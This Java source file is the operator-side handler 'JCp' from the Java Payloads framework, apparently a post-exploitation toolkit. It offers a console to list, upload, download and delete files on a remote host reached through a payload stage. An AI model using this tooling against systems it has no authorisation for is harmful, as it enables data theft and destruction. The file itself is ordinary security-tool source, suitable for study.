/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stage;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;

import javapayload.Parameter;
import javapayload.handler.stager.WrappedPipedOutputStream;

public class JCp extends StageHandler {
	
	public JCp() {
		super("Upload and download files", true, true,
				"Command line interface to upload and download files.");
	}
	
	public Parameter[] getParameters() {
		return new Parameter[0];
	}

	protected void handleStreams(DataOutputStream out, InputStream in, String[] parameters) throws Exception {

		// start local JCp stage (to keep code simple)
		final PipedInputStream localIn = new PipedInputStream();
		final PipedOutputStream localOut = new PipedOutputStream();
		final WrappedPipedOutputStream wrappedLocalOut = new WrappedPipedOutputStream(localOut);
		final OutputStream wout = new WrappedPipedOutputStream(new PipedOutputStream(localIn), wrappedLocalOut);
		final InputStream win = new PipedInputStream(localOut);
		new Thread(new Runnable() {
			public void run() {
				try {
					new javapayload.stage.JCp().start(new DataInputStream(win), wout, null);
				} catch (Throwable t) {
					t.printStackTrace();
				}
			}
		}).start();

		// collect stage streams. [0] = local, [1] = remote
		final DataInputStream[] stageIn = new DataInputStream[] { new DataInputStream(localIn), new DataInputStream(in) };
		final DataOutputStream[] stageOut = new DataOutputStream[] { new DataOutputStream(wrappedLocalOut), out };

		// handle console input
		DataInputStream dis = new DataInputStream(consoleIn);
		while (true) {
			consoleOut.print("JCp> ");
			// yes I know this is deprecated. but BufferedReader is way too
			// bloated for what we need here
			String line = dis.readLine().trim();
			if (line.length() == 0)
				continue;
			if (line.equals("exit")) {
				break;
			}
			int mode;
			if (line.equals("help")) {
				consoleOut.println("Remote paths start with a colon (:).");
				consoleOut.println();
				consoleOut.println("Create directory: +localdir");
				consoleOut.println("                  +:remotedir");
				consoleOut.println("List directory: localdir");
				consoleOut.println("                :remotedir");
				consoleOut.println("Delete file/directory: -localfile");
				consoleOut.println("                       -:remotefile");
				consoleOut.println("Copy file: localfile -> localfile");
				consoleOut.println("           localfile -> :remotefile");
				consoleOut.println("           :remotefile -> localfile");
				consoleOut.println("           :remotefile -> :remotefile");
				continue;
			} else if (line.startsWith("+")) {
				mode = javapayload.stage.JCp.JCP_MKDIR;
				line = line.substring(1);
			} else if (line.startsWith("-")) {
				mode = javapayload.stage.JCp.JCP_RM;
				line = line.substring(1);
			} else if (line.indexOf(" -> ") != -1) {
				int pos = line.indexOf(" -> ");
				String source = line.substring(0, pos).trim();
				String dest = line.substring(pos + 4).trim();
				int sourcetarget = 0, desttarget = 0;
				if (source.startsWith(":")) {
					sourcetarget = 1;
					source = source.substring(1);
				}
				if (dest.startsWith(":")) {
					desttarget = 1;
					dest = dest.substring(1);
				}
				if (sourcetarget == desttarget) {
					stageOut[desttarget].writeByte(javapayload.stage.JCp.JCP_CP_LOCAL);
					stageOut[desttarget].writeUTF(source);
					stageOut[desttarget].writeUTF(dest);
					stageOut[desttarget].flush();
					consoleOut.println(stageIn[desttarget].readUTF());
				} else {
					stageOut[sourcetarget].writeByte(javapayload.stage.JCp.JCP_CP_SEND);
					stageOut[sourcetarget].writeUTF(source);
					stageOut[sourcetarget].flush();
					long length = stageIn[sourcetarget].readLong();
					stageOut[desttarget].writeByte(javapayload.stage.JCp.JCP_CP_RECV);
					stageOut[desttarget].writeUTF(dest);
					stageOut[desttarget].writeLong(length);
					javapayload.stage.JCp.forwardLimited(stageIn[sourcetarget], stageOut[desttarget], length);
					stageOut[desttarget].flush();
					consoleOut.println(stageIn[sourcetarget].readUTF());
					consoleOut.println(stageIn[desttarget].readUTF());
				}
				continue;
			} else {
				mode = javapayload.stage.JCp.JCP_LS;
			}
			int target = 0;
			if (line.startsWith(":")) {
				target = 1;
				line = line.substring(1);
			}
			stageOut[target].writeByte(mode);
			stageOut[target].writeUTF(line.trim());
			stageOut[target].flush();
			consoleOut.println(stageIn[target].readUTF());
		}
		for (int i = 0; i < 2; i++) {
			stageOut[i].writeByte(javapayload.stage.JCp.JCP_END);
			stageOut[i].writeUTF("");
			stageOut[i].close();
		}
		consoleIn.close();
		consoleOut.close();
	}

	public Class[] getNeededClasses() {
		return new Class[] { javapayload.stage.Stage.class, javapayload.stage.JCp.class };
	}

	protected StageHandler createClone() {
		return new JCp();
	}
}